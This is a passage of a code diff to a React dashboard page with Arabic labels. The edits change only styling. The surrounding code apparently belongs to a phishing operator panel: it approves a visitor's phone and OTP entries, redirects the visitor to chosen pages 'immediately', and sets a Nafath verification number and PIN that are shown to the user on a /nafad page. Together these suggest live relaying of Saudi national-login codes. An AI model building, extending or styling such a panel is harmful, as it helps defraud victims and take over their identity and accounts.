+                      <p className="text-[10px] text-gray-500 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
                       <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
 
                     <div>
-                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة الجوال</p>
-                      <p className="text-[10px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
+                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة الجوال</p>
+                      <p className="text-[10px] text-gray-500 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
                       <ApprovalActions record={selectedRecord} field="phoneApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
                   </div>
@@ -938,7 +1037,7 @@ export default function DashboardPage() {
 
                 {/* ── Page Navigation ──────────────────────────────────── */}
                 <Section title="توجيه الزائر" icon={Globe}>
-                  <p className="text-[10px] text-gray-400 mb-2">اضغط على أي صفحة لتوجيه الزائر إليها فوراً</p>
+                  <p className="text-[10px] text-gray-500 mb-2">اضغط على أي صفحة لتوجيه الزائر إليها فوراً</p>
                   <NavigateVisitorControl record={selectedRecord} onUpdate={handleUpdate} />
                 </Section>
 
@@ -946,8 +1045,8 @@ export default function DashboardPage() {
                 <Section title="حقول التحكم" icon={Settings}>
                   <div className="space-y-4">
                     <div>
-                      <p className="text-xs font-semibold text-gray-700 mb-1">رقم التحقق في نفاذ (authNumber)</p>
-                      <p className="text-[10px] text-gray-400 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
+                      <p className="text-xs font-semibold text-gray-300 mb-1">رقم التحقق في نفاذ (authNumber)</p>
+                      <p className="text-[10px] text-gray-500 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
                       <TextFieldControl
                         key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
                         record={selectedRecord}
@@ -958,8 +1057,8 @@ export default function DashboardPage() {
                     </div>
 
                     <div>
-                      <p className="text-xs font-semibold text-gray-700 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
-                      <p className="text-[10px] text-gray-400 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
+                      <p className="text-xs font-semibold text-gray-300 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
+                      <p className="text-[10px] text-gray-500 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
                       <TextFieldControl
                         key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
                         record={selectedRecord}
@@ -980,7 +1079,7 @@ export default function DashboardPage() {
 
                 {/* ── Raw JSON ──────────────────────────────────────────── */}
                 <Section title="البيانات الخام (JSON)" icon={FileText} defaultOpen={false}>
-                  <pre className="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto max-h-64 leading-relaxed" dir="ltr">
+                  <pre className="bg-[#0b141a] text-green-400 p-4 rounded-lg text-xs overflow-x-auto max-h-64 leading-relaxed border border-[#2a3942]" dir="ltr">
                     {JSON.stringify(selectedRecord, null, 2)}
                   </pre>
                 </Section>
